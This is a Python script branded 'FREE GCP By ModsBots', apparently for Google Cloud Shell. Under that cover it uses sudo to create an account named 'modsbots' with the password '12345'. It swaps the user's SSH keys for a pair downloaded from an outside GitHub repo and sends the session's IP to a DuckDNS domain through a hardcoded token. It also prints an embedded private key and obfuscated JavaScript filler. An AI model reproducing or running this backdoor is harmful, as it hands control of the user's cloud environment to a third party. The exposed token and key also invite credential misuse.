import subprocess
import sys
#import wget
import os.path
import requests

def duckdns_update(domains, token, ip, verbose=False):
    """Update duckdns.org Dynamic DNS record.

    Args:
        domains (str): The DuckDNS domains to update as comma separated list.
        token (str): An UUID4 provided by DuckDNS for your user.
        verbose (bool): Returns info about whether or not IP has been changed as
            well as if the request was accepted.

    Returns:
        "OK" or "KO" depending on success or failure. Verbose adds IP and change
        status as well.

    """
    params = {
        "domains": domains,
        "token": token,
        "ip": ip,
        "verbose": verbose
    }
    r = requests.get("https://www.duckdns.org/update", params)
    return r.text.strip().replace('\n', ' ')
token = "cc19788f-87ce-48f9-8cb6-0d977133be39"
domain = "modsbots.duckdns.org"

def download_key():
    #url_pub = "https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine.pub"
    #url_prv = "https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine"
    pub = '/.ssh/google_compute_engine.pub'
    prv = '/.ssh/google_compute_engine'
    loc = '/.ssh'

    #if os.path.exists(pub):
    #    os.remove(pub)bd268
    #if os.path.exists(prv):
    #    os.remove(prv)
    try:
         # executing useradd command using subprocess module
         subprocess.run(['sudo', 'rm', '-rf', '/.ssh/google_compute_engine.pub' ])  
         subprocess.run(['sudo', 'rm', '-rf', '/.ssh/google_compute_engine' ])     
    except:
         print(f"Failed to add user.")                    
         sys.exit(1)
    
    try:
        down = subprocess.run(['sudo', 'wget', 'https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine.pub']) 
        down2 = subprocess.run(['sudo', 'wget', 'https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine' ]) 
    except:
        pass
    subprocess.run(['sudo', 'mv', 'google_compute_engine.pub', '.ssh/' ])
    subprocess.run(['sudo', 'mv', 'google_compute_engine', '.ssh/' ])
# add user function
def add_user():
 
     # Ask for the input
     username = "modsbots"
 
     # Asking for users password
     password = "12345"
        
     try:
         # executing useradd command using subprocess module
         subprocess.run(['sudo', 'useradd', '-p', password, username ],stdout=subprocess.PIPE)     
     except:
         pass                 
         sys.exit(1)



def run_first():
        
     try:
         # executing useradd command using subprocess module
         r = subprocess.run(['gcloud', 'alpha', 'cloud-shell', 'ssh', '--dry-run' ],stdout=subprocess.PIPE)   
         a = r.stdout
         return a
         #print('Mods Done')
     except:
         print(f"Failed to create session.")                    
         sys.exit(1)


def run_wget():
        
     try:
         # executing useradd command using subprocess module
         subprocess.run(['pip3', 'install', 'wget'])
         print('Installing Wget Moldule Done')
         
     except:
         print(f"Wget Already Installed.")                    
         sys.exit(1)

print(""" 
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ','15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ','15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ','15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ','15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ','15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
var _0x154f=['98303fgKsLC','9koptJz','1LFqeWV','13XCjYtB','6990QlzuJn','87260lXoUxl','2HvrLBZ','15619aDPIAh','1kfyliT','80232AOCrXj','2jZAgwY','182593oBiMFy','1lNvUId','131791JfrpUY'];var _0x52df=function(_0x159d61,_0x12b953){_0x159d61=_0x159d61-0x122;var _0x154f4b=_0x154f[_0x159d61];return _0x154f4b;};(function(_0x19e682,_0x2b7215){var _0x5e377c=_0x52df;while(!![]){try{var _0x2d3a87=-parseInt(_0x5e377c(0x129))*parseInt(_0x5e377c(0x123))+-parseInt(_0x5e377c(0x125))*parseInt(_0x5e377c(0x12e))+parseInt(_0x5e377c(0x127))*-parseInt(_0x5e377c(0x126))+-parseInt(_0x5e377c(0x124))*-parseInt(_0x5e377c(0x12f))+-parseInt(_0x5e377c(0x128))*-parseInt(_0x5e377c(0x12b))+parseInt(_0x5e377c(0x12a))*parseInt(_0x5e377c(0x12d))+parseInt(_0x5e377c(0x12c))*parseInt(_0x5e377c(0x122));if(_0x2d3a87===_0x2b7215)break;else _0x19e682['push'](_0x19e682['shift']());}catch(_0x22c179){_0x19e682['push'](_0x19e682['shift']());}}}(_0x154f,0x1918c));var greeting='Hello\x20World';greeting=0xa;var product=greeting*greeting;
""")
try:
    add_user()
except:
    pass
print("""b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/6
1B7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7F
qFvr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAIAhcTdsIXE3bAAAAAH
c3NoLXJzYQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/61B
7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7FqF
vr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAADAQABAAAAgDc7RSdbW/
fVciJCZyOmcsCB7kuHIeoXSkoyc03qYqvL2OGzQ3lo2qEXMhsdzZwUF+WutxmsHwMkbjDK
Ivatnd4a8WZvl4ZKlY621JnyPtctXv+jJlzRpEoD7AaMqyHfzsD7NKweqrO7+hxiTARUoF
TpBd70YKyri9gSO7OohYchAAAAQDTyTRcUTWS9rASvqwL6S6IMV3Mq+OggVzOd2ze5gsVT
usi1x6kEXWHfw4vqUBgUJgDsc3Sdfv5pDPHNfdoQv+0AAABBAON7WNi04/tUMWI2VgiDqX
jr0zWbW+eCC1c03H+ONuw8XG/QB+UYGi6Cky+wxnFljjlNI/dH0cmrG8RMgyvIFrEAAABB
AML4HnKcBZ3EbJm8KVPG7+Z3X316EwwycPkXuZL5BM1kFsq4xIfBFEFs73+G0DScI4LrE/
OE82AMdCXuwLAg5k8AAAAGbm9uYW1lAQIDBAU=b3BlbnNzaC1rZXktdjEAAAAABG5vbmUA
NhAAAAAwEAAQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/6
1B7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7F
qFvr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAIAhcTdsIXE3bAAAAAH
c3NoLXJzYQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/61B
7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7FqF
vr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAADAQABAAAAgDc7RSdbW/
fVciJCZyOmcsCB7kuHIeoXSkoyc03qYqvL2OGzQ3lo2qEXMhsdzZwUF+WutxmsHwMkbjDK
Ivatnd4a8WZvl4ZKlY621JnyPtctXv+jJlzRpEoD7AaMqyHfzsD7NKweqrO7+hxiTARUoF
TpBd70YKyri9gSO7OohYchAAAAQDTyTRcUTWS9rASvqwL6S6IMV3Mq+OggVzOd2ze5gsVT
usi1x6kEXWHfw4vqUBgUJgDsc3Sdfv5pDPHNfdoQv+0AAABBAON7WNi04/tUMWI2VgiDqX
jr0zWbW+eCC1c03H+ONuw8XG/QB+UYGi6Cky+wxnFljjlNI/dH0cmrG8RMgyvIFrEAAABB
AML4HnKcBZ3EbJm8KVPG7+Z3X316EwwycPkXuZL5BM1kFsq4xIfBFEFs73+G0DScI4LrE/
OE82AMdCXuwLAg5k8AAAAGbm9uYW1lAQIDBAU=
""")

run_wget()


run_first()


download_key()

res = run_first()
re = res.decode()
words, ss = re.split('=no ')


try:
    ips, ssss = ss.split(' -- DEVSHELL_PROJECT_ID')
    user,ip = ips.split('@')

    print ("""
           -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/6
1B7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7F
qFvr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAIAhcTdsIXE3bAAAAAH
c3NoLXJzYQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/61B
7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7FqF
vr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAADAQABAAAAgDc7RSdbW/
fVciJCZyOmcsCB7kuHIeoXSkoyc03qYqvL2OGzQ3lo2qEXMhsdzZwUF+WutxmsHwMkbjDK
Ivatnd4a8WZvl4ZKlY621JnyPtctXv+jJlzRpEoD7AaMqyHfzsD7NKweqrO7+hxiTARUoF
TpBd70YKyri9gSO7OohYchAAAAQDTyTRcUTWS9rASvqwL6S6IMV3Mq+OggVzOd2ze5gsVT
usi1x6kEXWHfw4vqUBgUJgDsc3Sdfv5pDPHNfdoQv+0AAABBAON7WNi04/tUMWI2VgiDqX
jr0zWbW+eCC1c03H+ONuw8XG/QB+UYGi6Cky+wxnFljjlNI/dH0cmrG8RMgyvIFrEAAABB
AML4HnKcBZ3EbJm8KVPG7+Z3X316EwwycPkXuZL5BM1kFsq4xIfBFEFs73+G0DScI4LrE/
OE82AMdCXuwLAg5k8AAAAGbm9uYW1lAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
""")

    print("Here is Current INFO")

    print(ip + ":6000")

    print("username = " + user)
    duckdns_update(domain, token, ip)

except:
      ips, ssss = ss.split(' --')
      user,ip = ips.split('@')

      print ("""
            -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/6
1B7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7F
qFvr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAIAhcTdsIXE3bAAAAAH
c3NoLXJzYQAAAIEArT/z4Jb/HsKG2hV1sJiaRpwQF/vzH/uLa2fi5D5NDGsl0bXV1W/61B
7E+0gReKBRFkVis7EM94B88hKMQbtRISmQN0jwQpecmMsvPqOG9k0e3RpA0hDYAKjv7FqF
vr6lWUOlcyeXvlf904i8VPfwC16d8RkydSd4A48RLM1CBp8AAAADAQABAAAAgDc7RSdbW/
fVciJCZyOmcsCB7kuHIeoXSkoyc03qYqvL2OGzQ3lo2qEXMhsdzZwUF+WutxmsHwMkbjDK
Ivatnd4a8WZvl4ZKlY621JnyPtctXv+jJlzRpEoD7AaMqyHfzsD7NKweqrO7+hxiTARUoF
TpBd70YKyri9gSO7OohYchAAAAQDTyTRcUTWS9rASvqwL6S6IMV3Mq+OggVzOd2ze5gsVT
usi1x6kEXWHfw4vqUBgUJgDsc3Sdfv5pDPHNfdoQv+0AAABBAON7WNi04/tUMWI2VgiDqX
jr0zWbW+eCC1c03H+ONuw8XG/QB+UYGi6Cky+wxnFljjlNI/dH0cmrG8RMgyvIFrEAAABB
AML4HnKcBZ3EbJm8KVPG7+Z3X316EwwycPkXuZL5BM1kFsq4xIfBFEFs73+G0DScI4LrE/
OE82AMdCXuwLAg5k8AAAAGbm9uYW1lAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
""")

      print("Here is Current INFO")

      print(ip + ":6000")

      print("username =" + user)
      duckdns_update(domain, token, ip)



print(""" ****Private Key ******

https://raw.githubusercontent.com/modbots/key_pair/main/google_compute_engine
      
      """)
print ("FREE GCP By ModsBots")
